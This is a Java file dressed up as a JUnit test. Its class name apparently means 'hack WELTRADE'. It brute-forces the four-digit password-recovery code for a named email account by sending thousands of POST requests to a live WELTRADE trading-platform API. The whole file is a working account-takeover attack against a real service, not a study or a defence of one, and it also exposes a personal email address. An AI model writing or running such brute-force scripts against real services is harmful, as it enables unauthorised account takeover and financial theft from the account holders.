import com.squareup.okhttp.*;
import org.junit.Test;
import org.testng.Assert;

import java.io.IOException;

public class VzlomWELTRADE extends Assert {

    int [] num = {0,1,2,3,4,5,6,7,8,9};

    int num1 = 0;
    int num2 = 0;
    int num3 = 5;
    int num4 = 6;

    @Test
    public void codeConfirm() throws IOException {

        for(int i = 1; i < 10001; i++) {

            if(num1 >9){
                num1 = 0;
                num2++;
                if(num2> 9){
                    num2 = 0;
                    num3 ++;
                    if(num3 > 9){
                        num3 = 0;
                        num4 ++;
                    }
                }
            }



            System.out.println(num4 + "" +num3 + "" + num2 + "" + num1);
            String po = num4 + "" +num3 + "" + num2 + "" + num1;
            OkHttpClient client = new OkHttpClient();

            MediaType mediaType = MediaType.parse("application/octet-stream");
            RequestBody body = RequestBody.create(mediaType, "[{\"action\":\"client.passwordRecovery\",\"data\":{\"email\":\"savchukvi12@gmail.com\",\"code\":\""+po+"\",\"action\":\"check\"}}]");
            Request request = new Request.Builder()
                    .url("https://www.weltrade.com/api/v1/")
                    .post(body)
                    .addHeader("cache-control", "no-cache")
                    .addHeader("Postman-Token", "8ac75ad6-5b08-4f1f-bfd2-865968cac149")
                    .build();

            Response response = client.newCall(request).execute();
            num1++;
        }

        }

    }

